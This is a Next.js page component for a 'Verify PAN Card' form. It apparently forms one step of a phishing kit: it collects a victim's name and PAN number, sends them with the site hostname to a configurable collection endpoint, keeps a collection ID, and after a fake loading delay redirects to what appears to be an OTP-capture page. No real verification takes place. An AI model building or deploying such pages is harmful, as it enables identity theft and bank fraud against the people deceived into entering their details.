'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useState } from "react";  
import DateInputComponent from "../inlcude/DateInputComponent";
import Loader from "../inlcude/Loader";


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const [loading, setLoading] = useState(false);
    const [loader, setLoader] = useState(false);


    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        const SITE = window.location.hostname;
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        // jsonObject1['id'] = localStorage.getItem("collection_id");
        setLoading(true);
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            if(responseData.status==200){
                localStorage.setItem('collection_id', responseData.data);
                localStorage.setItem('next', "4");
                localStorage.setItem('next_page_otp_times', 0);
                setLoader(true);
                setTimeout(function(){
                  router.push('/ott');
                  setLoader(false);
                },5000)
            }else{
              alert("not found ss");
            }
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }finally{
          setLoading(false);
        }
    };
  return (
    <>
    <Header />
    {
      loader ? (
        <Loader />
      ):(
        <div className="App">
        <div className="mainContent">
          <h1 className="text-center">Verify PAN Card</h1>
          <div className="card">
            <form
              className="LoginForm myform"
              id="firebaseForm"
              onSubmit={handleSubmit}
              target="hidden_iframe"
            >
              <input type="hidden" name="" defaultValue="" />
              <div className="form-group">
                <label
                  htmlFor="Full_Name"
                  style={{ fontSize: 13, fontFamily: '"Work Sans", sans-serif' }}
                >
                  Name on Pancard<p1 style={{ fontSize: 13, color: "red" }}>*</p1>
                </label>
                <input
                  type="text"
                  className="new-control"
                  id="Full_Name"
                  name="FN"
                  minLength={3}
                  maxLength={30}
                  required
                  defaultValue=""
                />
              </div>
              <div className="form-group">
                <label
                  htmlFor="PAN_Number"
                  style={{ fontSize: 13, fontFamily: '"Work Sans", sans-serif' }}
                >
                  PAN Card Number<p1 style={{ fontSize: 13, color: "red" }}>*</p1>
                </label>
                <input
                  maskplaceholder=""
                  className="new-control"
                  id="PAN_Number"
                  name="PNO"
                  inputMode="text"
                  pattern="[A-Za-z]{5}\d{4}[A-Za-z]{1}"
                  required
                  minLength={10}
                  maxLength={10}
                  defaultValue=""
                />
              </div>
              <div className="text-center">
                <input type="submit" disabled={loading} className="submit" />
              </div>
            </form>
          </div>
        </div>
      </div>
      
      )
    }
   

    <Footer />
  </>
  );
}
